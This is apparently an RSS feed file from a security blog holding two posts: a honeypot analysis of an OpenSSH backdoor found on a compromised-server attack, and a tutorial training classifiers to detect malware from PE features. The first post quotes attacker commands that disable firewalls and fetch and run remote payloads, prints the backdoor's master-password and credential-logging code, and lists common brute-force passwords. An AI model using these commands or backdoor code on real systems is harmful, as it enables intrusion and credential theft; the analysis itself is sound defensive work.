@@ -1,0 +1,789 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on Te(k|ch) blog</title>
+    <link>https://www.randhome.io/post/</link>
+    <description>Recent content in Posts on Te(k|ch) blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 01 Aug 2016 14:53:42 +0200</lastBuildDate>
+    <atom:link href="https://www.randhome.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Openssh backdoor used on compromised Linux servers</title>
+      <link>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</link>
+      <pubDate>Mon, 01 Aug 2016 14:53:42 +0200</pubDate>
+      
+      <guid>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</guid>
+      <description>
+
+&lt;p&gt;Olà,&lt;/p&gt;
+
+&lt;p&gt;Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the &lt;a href=&#34;https://github.com/cowrie/cowrie&#34;&gt;cowrie&lt;/a&gt; ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check &lt;a href=&#34;https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian&#34;&gt;here&lt;/a&gt; to install it).&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.randhome.io/media/doctor8.jpg&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;cowrie-ssh&#34;&gt;Cowrie ssh&lt;/h2&gt;
+
+&lt;p&gt;This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2015-11-10 08:43:04+0100 [SSHService ssh-userauth on HoneyPotTransport,17996,177.124.226.37] login attempt [bayvit/bayvit] failed
+2015-11-10 08:44:42+0100 [SSHService ssh-userauth on HoneyPotTransport,17997,177.124.226.37] login attempt [explore/explore] failed
+2015-11-10 08:45:11+0100 [SSHService ssh-userauth on HoneyPotTransport,17998,106.186.116.239] login attempt [jonathan/111111] failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here is a short top 20 of most used users and passwords :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Top 20 users&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;root&lt;/li&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;test&lt;/li&gt;
+&lt;li&gt;user&lt;/li&gt;
+&lt;li&gt;oracle&lt;/li&gt;
+&lt;li&gt;postgres&lt;/li&gt;
+&lt;li&gt;guest&lt;/li&gt;
+&lt;li&gt;ubnt&lt;/li&gt;
+&lt;li&gt;git&lt;/li&gt;
+&lt;li&gt;nagios&lt;/li&gt;
+&lt;li&gt;ftpuser&lt;/li&gt;
+&lt;li&gt;ubuntu&lt;/li&gt;
+&lt;li&gt;tomcat&lt;/li&gt;
+&lt;li&gt;pi&lt;/li&gt;
+&lt;li&gt;support&lt;/li&gt;
+&lt;li&gt;(empty user)&lt;/li&gt;
+&lt;li&gt;ftp&lt;/li&gt;
+&lt;li&gt;teamspeak&lt;/li&gt;
+&lt;li&gt;mysql&lt;/li&gt;
+&lt;li&gt;bin&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Top 20 passwords&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;123456&lt;/li&gt;
+&lt;li&gt;password&lt;/li&gt;
+&lt;li&gt;root123 (used regularly as accepted by cowrie)&lt;/li&gt;
+&lt;li&gt;1234&lt;/li&gt;
+&lt;li&gt;12345&lt;/li&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;test&lt;/li&gt;
+&lt;li&gt;root&lt;/li&gt;
+&lt;li&gt;123&lt;/li&gt;
+&lt;li&gt;(empty password)&lt;/li&gt;
+&lt;li&gt;1&lt;/li&gt;
+&lt;li&gt;p@ssw0rd&lt;/li&gt;
+&lt;li&gt;!@&lt;/li&gt;
+&lt;li&gt;wubao&lt;/li&gt;
+&lt;li&gt;jiamima&lt;/li&gt;
+&lt;li&gt;!q@w&lt;/li&gt;
+&lt;li&gt;!&lt;/li&gt;
+&lt;li&gt;!qaz@wsx&lt;/li&gt;
+&lt;li&gt;qwerty&lt;/li&gt;
+&lt;li&gt;user&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Successfull attacks often juste download a malicious script/binary and execute it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;what-are-those-files&#34;&gt;What are those files?!?&lt;/h2&gt;
+
+&lt;p&gt;Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2016-01-21 19:37:19+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] login attempt [root/root123] succeeded
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] root authenticated with keyboard-interactive
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] starting service ssh-connection
+2016-01-21 19:37:20+0100 [SSHService ssh-connection on HoneyPotTransport,111016, 37.228.227.119] got channel session request
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] channel open
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] pty request: xterm (24, 80, 0, 0)
+[SNIP]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The cowrie log is pretty long because&amp;hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&amp;rsquo;t implement all the shell commands), and in the end the interesting one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;unset HISTFILE
+unset HISTSAVE
+unset SAVEFILE
+unset ********
+history -n
+unset WATCH
+export HISTFILE=/dev/null
+w
+sshd
+uname -a
+ps x
+cat /etc/hosts
+/sbin/ifconfig -a |grep inet | wc -l
+ls -la
+wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
+ls -la
+cd ..
+rm -rf ssh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here the attacker doesn&amp;rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.&lt;/p&gt;
+
+&lt;p&gt;Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor&#34;&gt;github&lt;/a&gt; if you want to check by yourself)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; cat v
+OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is still one weird thing : what is this &lt;em&gt;backdoor.h&lt;/em&gt; file ?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/* backdoor stuff */
+#define BACKDOORPASSWD &amp;quot;SSHD_PASS&amp;quot;
+#define LOGGING_PASSWORDS 1
+#define PASSWORDS_LOG_FILE &amp;quot;LOG_PATH&amp;quot;
+
+int backdoor_active;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The BACKDOORPASSWD macro is used in the file &lt;em&gt;auth-passwd.c&lt;/em&gt;, in the auth_password function in charge of checking the users password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    backdoor_active = 0;
+    if(strcmp(password, BACKDOORPASSWD) == 0)
+    {
+        backdoor_active = 1;
+        return 1;
+    }
+    else
+    {
+    [LEGITIMATE CODE]
+    [...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Strangely, this backdoor also implements a logging functionnality both in &lt;em&gt;sshconnect1.c&lt;/em&gt; and &lt;em&gt;sshconnect2.c&lt;/em&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    if((strcmp(BACKDOORPASSWD,password) != 0) &amp;amp;&amp;amp; LOGGING_PASSWORDS)
+      {
+        FILE *fp = fopen(PASSWORDS_LOG_FILE,&amp;quot;a&amp;quot;);
+        fprintf (fp,&amp;quot;+host: %s +user: %s +password: %s\n&amp;quot;, get_remote_ipaddr(), options.user, password);
+        fclose (fp)
+      }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In &lt;em&gt;session.c&lt;/em&gt;, the backdoor disable the hist file and force the suid to 0 (root):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;     if(backdoor_active)
+        child_set_env(&amp;amp;env, &amp;amp;envsize, &amp;quot;HISTFILE&amp;quot;, &amp;quot;/dev/null&amp;quot;);
+
+    [...]
+
+    if(!backdoor_active)
+      {
+        [SNIP]
+      }
+    else
+      {
+        setgid(0);
+        initgroups(pw-&amp;gt;pw_name, 0);
+      }
+
+    [...]
+    if(!backdoor_active)
+        permanently_set_uid(pw);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally in &lt;em&gt;sshlogin.c&lt;/em&gt;, it disable logging of connections using the backdoor password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/*
+* Records that the user has logged in.  I these parts of operating systems
+* were more standardized.
+*/
+void
+record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
+    const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+      {
+        struct logininfo *li;
+
+        li = login_alloc_entry(pid, user, host, ttyname);
+        login_set_addr(li, addr, addrlen);
+        login_login(li);
+        login_free_entry(li);
+      }
+    }
+}
+#ifdef LOGIN_NEEDS_UTMPX
+void
+record_utmp_only(pid_t pid, const char *ttyname, const char *user,
+                 const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, host, ttyname);
+  login_set_addr(li, addr, addrlen);
+  login_utmp_only(li);
+  login_free_entry(li);
+}}
+#endif
+
+/* Records that the user has logged out. */
+void
+record_logout(pid_t pid, const char *ttyname, const char *user)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, NULL, ttyname);
+  login_logout(li);
+  login_free_entry(li);
+}
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All these modifications are in the &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch&#34;&gt;openssh-3.6.1p2-backdoor.patch&lt;/a&gt; included in the code.&lt;/p&gt;
+
+&lt;h2 id=&#34;lets-do-threat-intelligence&#34;&gt;Lets do Threat Intelligence&lt;/h2&gt;
+
+&lt;p&gt;So let&amp;rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).&lt;/p&gt;
+
+&lt;p&gt;This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).&lt;/p&gt;
+
+&lt;p&gt;I have learnt recently that the &lt;a href=&#34;https://www.dshield.org/&#34;&gt;SANS Dshield Group&lt;/a&gt; collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called &lt;a href=&#34;https://github.com/jkakavas/kippo-pyshield&#34;&gt;kippo-pyshield&lt;/a&gt; to do this).&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s check what we can learn about the IP from the &lt;a href=&#34;https://dshield.org/api/&#34;&gt;Dshield API&lt;/a&gt;, you just have to visit &lt;a href=&#34;https://isc.sans.edu/api/ip/37.228.227.119&#34;&gt;https://isc.sans.edu/api/ip/37.228.227.119&lt;/a&gt; (?json or ?text can be added to change the format):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;ip&amp;gt;
+    &amp;lt;number&amp;gt;37.228.227.119&amp;lt;/number&amp;gt;
+    &amp;lt;count/&amp;gt;
+    &amp;lt;attacks/&amp;gt;
+    &amp;lt;maxdate/&amp;gt;
+    &amp;lt;mindate/&amp;gt;
+    &amp;lt;updated/&amp;gt;
+    &amp;lt;comment/&amp;gt;
+    &amp;lt;maxrisk/&amp;gt;
+    &amp;lt;asabusecontact&amp;gt;noc@libertyglobal.com&amp;lt;/asabusecontact&amp;gt;
+    &amp;lt;as&amp;gt;6830&amp;lt;/as&amp;gt;
+    &amp;lt;asname&amp;gt;
+	&amp;lt;![CDATA[
+	    LGI-UPC formerly known as UPC Broadband Holding B.V.,
+	]]&amp;gt;
+    &amp;lt;/asname&amp;gt;
+    &amp;lt;ascountry&amp;gt;AT&amp;lt;/ascountry&amp;gt;
+    &amp;lt;assize&amp;gt;8576685&amp;lt;/assize&amp;gt;
+    &amp;lt;network&amp;gt;37.228.224.0/19&amp;lt;/network&amp;gt;
+&amp;lt;/ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).&lt;/p&gt;
+
+&lt;p&gt;The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&amp;rsquo;t use any common framework (I contacted the owner, no answer yet).&lt;/p&gt;
+
+&lt;h2 id=&#34;iocs&#34;&gt;IOCs&lt;/h2&gt;
+
+&lt;p&gt;It&amp;rsquo;s not the new super-duper fancy APT group attack, but I like how &lt;a href=&#34;https://twitter.com/malware_traffic&#34;&gt;Brad&lt;/a&gt; ends &lt;a href=&#34;http://www.malware-traffic-analysis.net/&#34;&gt;his posts&lt;/a&gt; with a summary of what to check on your system, so here is a short summary:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Bruteforce IP : 37.228.227.119&lt;/li&gt;
+&lt;li&gt;URL of the malicious code : hxxp://fm.fo/images/cette.jpg (still available when writing the article, IP resolved is 77.243.43.9 in Denmark)&lt;/li&gt;
+&lt;li&gt;SSH backdoor password : SSHD_PASS&lt;/li&gt;
+&lt;li&gt;File created by the backdoor : LOG_PATH&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I&amp;rsquo;m still on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt; if you have any comment.&lt;/p&gt;
+
+&lt;p&gt;Ciao&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Machine learning for malware detection</title>
+      <link>https://www.randhome.io/blog/2016/07/16/machine-learning-for-malware-detection/</link>
+      <pubDate>Sat, 16 Jul 2016 12:52:42 +0200</pubDate>
+      
+      <guid>https://www.randhome.io/blog/2016/07/16/machine-learning-for-malware-detection/</guid>
+      <description>
+
+&lt;p&gt;Plop,&lt;/p&gt;
+
+&lt;p&gt;I have been reading many articles about Machine Learning recently, and it seems to be the new hype technology so I wanted to play a bit with these algorithms to better understand the principles behind it. If you don&amp;rsquo;t know machine learning, you should to read this &lt;a href=&#34;http://www.r2d3.us/visual-intro-to-machine-learning-part-1/&#34;&gt;awesome article&lt;/a&gt; or &lt;a href=&#34;https://redshiftzero.github.io/2015/08/29/Manipulation-and-Machine-Learning/&#34;&gt;this one&lt;/a&gt;. This article was largely inspired by &lt;a href=&#34;https://blog.socialcops.com/engineering/machine-learning-python&#34;&gt;this one which analyze the Titanic data&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;machine-learning-and-classification&#34;&gt;Machine Learning and Classification&lt;/h2&gt;
+
+&lt;p&gt;So the idea of machine learning is to let the algorithm learn by itself the best parameters from data in order to make good predictions. There are many different applications, in our case we will consider using machine learning algorithm to classify binaries between legitimate and malicious binaries. This idea is &lt;a href=&#34;http://ieeexplore.ieee.org/xpl/login.jsp?tp=&amp;amp;arnumber=924286&amp;amp;url=http%3A%2F%2Fieeexplore.ieee.org%2Fxpls%2Fabs_all.jsp%3Farnumber%3D924286&#34;&gt;not&lt;/a&gt; &lt;a href=&#34;http://ieeexplore.ieee.org/xpl/login.jsp?tp=&amp;amp;arnumber=1297538&amp;amp;url=http%3A%2F%2Fieeexplore.ieee.org%2Fxpls%2Fabs_all.jsp%3Farnumber%3D1297538&#34;&gt;new&lt;/a&gt; and Adobe has even released a tool called &lt;a href=&#34;https://github.com/adobe-security/Malware-classifier&#34;&gt;Adobe Malware Classifier&lt;/a&gt; at &lt;a href=&#34;https://www.blackhat.com/html/webcast/webcast-2012-polymorphicmalware.html&#34;&gt;Black Hat 2012&lt;/a&gt; but it will be a nice exercice to see how to use machine learning.&lt;/p&gt;
+
+&lt;p&gt;Here is the plan that we will follow :&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Extract as many features as we can from binaries to have a good training data set. The features have to be integers or floats to be usable by the algorithms&lt;/li&gt;
+&lt;li&gt;Identify the best features for the algorithm : we should select the information that best allows to differenciate legitimate files from malware.&lt;/li&gt;
+&lt;li&gt;Choose a classification algorithm&lt;/li&gt;
+&lt;li&gt;Test the efficiency of the algorithm and identify the False Positive/False negative rate&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.randhome.io/media/doctor5.jpg&#34; /&gt;
+    
+    
+    &lt;figcaption&gt;
+        &lt;h4&gt;Let&amp;#39;s go!&lt;/h4&gt;
+        
+    &lt;/figcaption&gt;
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;feature-extraction-from-binaries&#34;&gt;Feature Extraction from binaries&lt;/h2&gt;
+
+&lt;p&gt;As I said earlier, machine learning only uses integer or float data as features for detection, but it is not a big deal as most &lt;a href=&#34;https://manalyzer.org/report/1e27184759cc4099c0da73b152408281&#34;&gt;PE parameters&lt;/a&gt; are integers (field size, addresses, parameters&amp;hellip;). So I extracted all the PE parameters I could by using pefile, and considered especially the one that are relevant for identifying malware, like the entropy of section for packer detection. As we can only have a fix list of feature (and not one per section), I extracted the Mean, Minimum and Maximum of entropy for sections and resources.&lt;/p&gt;
+
+&lt;p&gt;Here is the final list of feature extracted : &lt;em&gt;Name, md5, Machine, SizeOfOptionalHeader, Characteristics, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase, SectionAlignment, FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, NumberOfRvaAndSizes, SectionsNb, SectionsMeanEntropy, SectionsMinEntropy, SectionsMaxEntropy, SectionsMeanRawsize, SectionsMinRawsize, SectionMaxRawsize, SectionsMeanVirtualsize, SectionsMinVirtualsize, SectionMaxVirtualsize, ImportsNbDLL, ImportsNb, ImportsNbOrdinal, ExportNb, ResourcesNb, ResourcesMeanEntropy, ResourcesMinEntropy, ResourcesMaxEntropy, ResourcesMeanSize, ResourcesMinSize, ResourcesMaxSize, LoadConfigurationSize, VersionInformationSize.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Many other feature could have been considered, for instance the number of suspicious function imported, or the number of section with a abnormal name, but it will be for another time (I ended the script a bit late in the night and forgot to implement those ¯\&lt;em&gt;(ツ)&lt;/em&gt;/¯ ).&lt;/p&gt;
+
+&lt;p&gt;Regarding the dataset, we need to have an important number of both legitimate and malicious file:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;For legitimate file, I gathered all the Windows binaries (exe + dll) from Windows 2008, Windows XP and Windows 7 32 and 64 bits, so exactly 41323 binaries. It is not a perfect dataset as there is only Microsoft binaries and not binaries from application which could have different properties, but I did not find any easy way to gather easily a lot of legitimate binaries, so it will be enough for playing&lt;/li&gt;
+&lt;li&gt;Regarding malware, I used a part of &lt;a href=&#34;https://virusshare.com/&#34;&gt;Virus Share&lt;/a&gt; collection by downloading one archive (the 134th) and kept only PE files (96724 different files).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I used &lt;a href=&#34;https://github.com/erocarrera/pefile&#34;&gt;pefile&lt;/a&gt; to extract all these features from the binaries and store them in a csv file (ugly code is &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/generatedata.py&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/data.csv&#34;&gt;data&lt;/a&gt; are here).&lt;/p&gt;
+
+&lt;p&gt;And here we are with a large CSV file (138048 lines) ready for playing!&lt;/p&gt;
+
+&lt;h2 id=&#34;feature-selection&#34;&gt;Feature Selection&lt;/h2&gt;
+
+&lt;p&gt;The idea of feature selection is to reduce the 54 features extracted to a smaller set of feature which are the most relevant for differentiating legitimate binaries from malware.&lt;/p&gt;
+
+&lt;p&gt;To play with the data, we will use &lt;a href=&#34;http://pandas.pydata.org/&#34;&gt;Pandas&lt;/a&gt; and then &lt;a href=&#34;http://scikit-learn.org/stable/index.html&#34;&gt;Scikit&lt;/a&gt; which largely uses the &lt;a href=&#34;http://www.numpy.org/&#34;&gt;numpy&lt;/a&gt; library:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;data = pd.read_csv(&#39;data.csv&#39;, sep=&#39;|&#39;)
+legit_binaries = data[0:41323].drop([&#39;legitimate&#39;], axis=1)
+malicious_binaries = data[41323::].drop([&#39;legitimate&#39;], axis=1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So a first way of doing it manually could be to check the different values and see if there is a difference between the two groups. For instance, we can take the parameter FileAlignment (which defines the alignment of sections and is by default 0x200 bytes) and check the values :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [8]: legit_binaries[&#39;FileAlignment&#39;].value_counts()
+Out[8]:
+512      36843
+4096      4313
+128         89
+32          40
+65536       36
+16           2
+Name: FileAlignment, dtype: int64
+
+In [9]: malicious_binaries[&#39;FileAlignment&#39;].value_counts()
+Out[9]:
+512     94612
+4096     2074
+128        18
+1024       15
+64          2
+32          1
+16          1
+2048        1
+Name: FileAlignment, dtype: int64
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So if we remove the 20 malware having weird values here, there is not much difference on this value between the two groups, this parameter would not make a good feature for us.&lt;/p&gt;
+
+&lt;p&gt;On the other side, some values are clearly interesting like the max entropy of the sections which can be represented with an histogram:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [12]: plt.hist([legit_binaries[&#39;SectionsMaxEntropy&#39;], malicious_binaries[&#39;SectionsMaxEntropy&#39;]], range=[0,8], normed=True, color=[&amp;quot;green&amp;quot;, &amp;quot;red&amp;quot;],label=[&amp;quot;legitimate&amp;quot;, &amp;quot;malicious&amp;quot;])
+Out[12]:
+([array([ 0.        ,  0.00120095,  0.00129333,  0.00914567,  0.08896238,
+        0.04665213,  0.12609933,  0.55631513,  0.37580371,  0.04452738]),
+  array([  9.04607814e-05,   0.00000000e+00,   1.29229688e-05,
+           1.55075625e-04,   5.16918751e-04,   1.51198735e-03,
+           6.04794938e-03,   8.64675840e-02,   3.81266348e-01,
+                                            7.73930754e-01])],
+  array([ 0. ,  0.8,  1.6,  2.4,  3.2,  4. ,  4.8,  5.6,  6.4,  7.2,  8. ]),
+  &amp;lt;a list of 2 Lists of Patches objects&amp;gt;)
+
+In [13]: plt.legend()
+Out[13]: &amp;lt;matplotlib.legend.Legend at 0x7f15da65ee10&amp;gt;
+
+In [14]: plt.show()
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.randhome.io/media/sectionsmaxentropy.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;But there is a more efficient way of selecting features : some algorithms have been developed to identify the most interesting features and reduce the dimensionality of the data set (see &lt;a href=&#34;http://scikit-learn.org/stable/modules/feature_selection.html&#34;&gt;the Scikit page for Feature Selection&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;In our case, we will use the &lt;a href=&#34;http://scikit-learn.org/stable/modules/feature_selection.html#tree-based-feature-selection&#34;&gt;Tree-based feature selection&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [15]: X = data.drop([&#39;Name&#39;, &#39;md5&#39;, &#39;legitimate&#39;], axis=1).values
+
+In [16]: y = data[&#39;legitimate&#39;].values
+
+In [17]: fsel = ske.ExtraTreesClassifier().fit(X, y)
+
+In [20]: model = SelectFromModel(fsel, prefit=True)
+
+In [21]: X_new = model.transform(X)
+
+In [22]: X.shape
+Out[22]: (110258, 54)
+
+In [23]: X_new.shape
+Out[23]: (110258, 11)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So in this case, the algorithm selected 11 important features among the 54, and we can notice that indeed the SectionsMaxEntropy is selected but other features (like the Machine value) are surprisingly also good parameters for this classification :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;In [1]: nb_features = X_new.shape[1]
+
+In [2]: indices = np.argsort(fsel.feature_importances_)[::-1][:nb_features]
+
+In [3]: for f in range(nb_features):
+   ...:         print(&amp;quot;%d. feature %s (%f)&amp;quot; % (f + 1, data.columns[2+indices[f]], fsel.feature_importances_[indices[f]]))
+      ...:
+      1. feature Characteristics (0.187685)
+      2. feature Machine (0.173019)
+      3. feature ImageBase (0.099215)
+      4. feature Subsystem (0.091090)
+      5. feature MajorSubsystemVersion (0.077067)
+      6. feature SectionsMaxEntropy (0.046552)
+      7. feature SizeOfOptionalHeader (0.040004)
+      8. feature ResourcesMaxEntropy (0.035633)
+      9. feature VersionInformationSize (0.027091)
+      10. feature SectionsNb (0.020562)
+      11. feature DllCharacteristics (0.018640)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;selection-of-the-classification-algorithm&#34;&gt;Selection of the Classification Algorithm&lt;/h2&gt;
+
+&lt;p&gt;The best classification algorithm depends on many parameters and some of them (like SVM) have a lot of different parameters and can be difficult to correctly configure. So I used a simple option: I tested some of them with default parameters and selected the best one (I removed SVM because it does not handle well dataset with many features):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;algorithms = {
+        &amp;quot;DecisionTree&amp;quot;: tree.DecisionTreeClassifier(max_depth=10),
+        &amp;quot;RandomForest&amp;quot;: ske.RandomForestClassifier(n_estimators=50),
+        &amp;quot;GradientBoosting&amp;quot;: ske.GradientBoostingClassifier(n_estimators=50),
+        &amp;quot;AdaBoost&amp;quot;: ske.AdaBoostClassifier(n_estimators=100),
+        &amp;quot;GNB&amp;quot;: GaussianNB()
+    }
+
+results = {}
+print(&amp;quot;\nNow testing algorithms&amp;quot;)
+for algo in algorithms:
+    clf = algorithms[algo]
+    clf.fit(X_train, y_train)
+    score = clf.score(X_test, y_test)
+    print(&amp;quot;%s : %f %%&amp;quot; % (algo, score*100))
+    results[algo] = score
+
+winner = max(results, key=results.get)
+print(&#39;\nWinner algorithm is %s with a %f %% success&#39; % (winner, results[winner]*100))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s run it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Now testing algorithms
+GNB : 69.478450 %
+DecisionTree : 98.960522 %
+RandomForest : 99.351684 %
+AdaBoost : 98.558493 %
+GradientBoosting : 98.761318 %
+
+Winner algorithm is RandomForest with a 99.351684 % success
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we recompute the false positive/false negative rate on the test data, we obtain :&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;False positive : 0.568241 %&lt;/li&gt;
+&lt;li&gt;False negative : 0.830565 %&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So it&amp;rsquo;s a 99.35% success, so more than the &lt;a href=&#34;https://www.blackhat.com/docs/webcast/TowardsClassificationofPolymorphicMalware-Final.pdf&#34;&gt;Adobe&lt;/a&gt; work (98.21%) but still with the RandomForest algorithm.&lt;/p&gt;
+
+&lt;p&gt;The whole code for feature selection and algorithm test is available &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/learning.py&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+
